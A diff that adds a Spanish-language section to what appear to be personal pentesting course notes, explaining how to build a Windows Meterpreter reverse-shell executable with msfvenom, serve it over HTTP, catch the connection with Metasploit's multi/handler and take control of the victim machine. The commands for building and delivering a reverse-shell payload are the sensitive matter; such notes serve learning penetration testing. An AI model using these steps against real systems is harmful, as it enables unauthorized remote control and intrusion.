@@ -568,4 +568,52 @@ pwd
 
 Este comando nos muestra el directorio actual en el que nos encontramos dentro de la máquina comprometida. Es útil para orientarnos y saber dónde estamos trabajando.
 
+---
+## Generar nuestros propios Payloads con Msfvenom 
+---
+
+Mario comienza explicando que Msfvenom es una herramienta de Metasploit que nos permite crear payloads personalizados para explotar vulnerabilidades en sistemas. Estos payloads son programas maliciosos que se ejecutan en la máquina víctima y permiten al atacante tomar el control del sistema.
+Para crear un payload personalizado, utilizamos el siguiente comando:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[Dirección IP de la máquina atacante] LPORT=[Puerto de escucha] -f exe -o pwned.exe
+```
+
+El recomienda buscar en google msfvenom linux o windows...
+
+Una vez que hemos creado el payload (archivo `pwned.exe`), debemos transferirlo a la máquina víctima. Para ello, podemos utilizar un servidor HTTP simple en Kali Linux:
+
+```bash
+python3 -m http.server 80
+```
+
+Este comando inicia un servidor web en el puerto 80 de Kali Linux, lo que nos permite servir archivos a través de HTTP.
+
+esto nos permite descargar el payload en la máquina víctima utilizando un navegador web o herramientas como `curl` o `wget`.
+
+Una vez descargado el archivo, volvemos a la terminal de Kali Linux y ejecutamos Metasploit
+
+Una vez abierto lanzamos el comando
+
+```bash
+use /multi/handler
+```
+Este comando nos permite utilizar el módulo de Metasploit que maneja las conexiones de los payloads que hemos creado. Es esencial para recibir la conexión inversa desde la máquina víctima una vez que se ejecute el payload.
+Después, configuramos los parámetros necesarios para el módulo usando `show options`:
+
+
+![Imagen multihandler](img/multihandler.png)
+
+Nos podemos fijar en la imagen que el payload options pone shell y nosotros hemos creado anteriormente un meterpreter, añadimos la configuración que falta:
+
+![Imagen multihandler](img/configmultihandler.png)
+
+hemos usado los comandos set `LPORT` y `LHOST` para establecer el puerto y la dirección IP de la máquina atacante, una vez hecho esto ejecutamos el comando `run` y con esto ya tenemos la conexión creada.
+
+Vamos a la máquina valorada y ejecutamos el payload que hemos creado anteriormente, en este caso `pwned.exe`.
+
+Una vez ejecutado el payload en la máquina víctima, deberíamos recibir una conexión inversa en Metasploit, lo que nos permitirá interactuar con la máquina comprometida a través de Meterpreter.
+
+![Imagen meterpreter](img/meterpreter.png)
+
 
